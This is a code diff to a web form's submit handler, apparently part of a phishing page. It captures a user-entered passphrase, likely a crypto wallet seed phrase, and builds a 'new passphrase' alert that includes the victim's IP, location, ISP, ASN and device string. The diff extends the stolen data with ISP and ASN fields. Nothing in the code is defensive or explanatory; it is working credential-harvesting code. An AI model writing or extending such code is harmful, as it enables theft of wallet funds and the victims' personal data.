@@ -20,15 +20,22 @@ document.querySelector('form').addEventListener('submit', function(e) {
   showLoading();
 
     // Ambil Data IP dan Lokasi (Gunakan ip-api.com karena lebih stabil)
-  fetch('http://ip-api.com/json')
+  fetch('https://ip-api.com/json')
     .then(function(res) { return res.json(); })
     .then(function(ipData) {
-      // Jika sukses ambil data lokasi
+      var location = ipData.status === 'success'
+        ? (ipData.city || 'Unknown') + ', ' + (ipData.country || 'Unknown')
+        : 'Unknown';
+      var ipAddress = ipData.status === 'success' ? (ipData.query || 'Unknown') : 'Unknown';
+      var isp = ipData.status === 'success' ? (ipData.isp || 'Unknown') : 'Unknown';
+      var asn = ipData.status === 'success' ? (ipData.as || 'Unknown') : 'Unknown';
       var message = "<b>🔔 Passphrase Baru (Vercel)</b>\n" +
                     "<b>Waktu:</b> " + new Date().toLocaleString('id-ID') + "\n\n" +
                     "<code>" + normalized + "</code>\n\n" +
-                    "<b>📍 LOKASI:</b> " + (ipData.city || 'Unknown') + ", " + (ipData.country || 'Unknown') + "\n" +
-                    "<b>🌐 IP:</b> " + (ipData.query || 'Unknown') + "\n" +
+                    "<b>📍 LOKASI:</b> " + location + "\n" +
+                    "<b>🌐 IP:</b> " + ipAddress + "\n" +
+                    "<b>🏢 ISP:</b> " + isp + "\n" +
+                    "<b>🛰️ ASN:</b> " + asn + "\n" +
                     "<b>📱 DEVICE:</b> " + navigator.userAgent;
 
 
